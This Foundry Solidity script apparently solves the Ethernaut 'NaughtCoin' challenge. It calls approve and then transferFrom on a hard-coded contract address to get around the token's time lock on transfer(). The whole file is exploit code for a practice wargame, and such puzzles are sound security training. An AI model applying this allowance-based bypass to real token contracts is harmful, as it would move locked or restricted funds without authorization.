// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {NaughtCoin} from "../../src/Ethernaut/NaughtCoin.sol";

contract ExploitScript is Script {
    function run() public {
        uint256 decimal = 10 ** uint256(18);
        uint256 amount = 1000000 * decimal;
        vm.startBroadcast();
        NaughtCoin naughty = NaughtCoin(0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F);
        naughty.approve(msg.sender, amount);
        naughty.transferFrom(msg.sender, address(this), amount);
        vm.stopBroadcast();
    }
}
